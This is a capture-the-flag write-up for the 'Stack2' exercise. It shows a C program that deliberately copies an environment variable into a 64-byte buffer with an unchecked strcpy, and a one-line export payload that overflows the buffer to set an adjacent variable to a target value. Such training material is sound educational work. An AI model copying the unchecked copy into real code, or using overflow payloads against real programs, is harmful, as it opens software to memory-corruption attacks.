# Stack2

## Description
Stack2 looks at environment variables, and how they can be set.

## Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
## Solution
On looking the source code we can see that we need to run the program with environment variable as `GREENIE`. This can be done using export command and then we can execute a command just like previous challenge to change the value of modified. This can be done as 
```bash
export GREENIE=$(python -c "print(('1'*64)+'\x0a\x0d\x0a\x0d')")
./stack2
```

![screenshot](screenshot.jpg)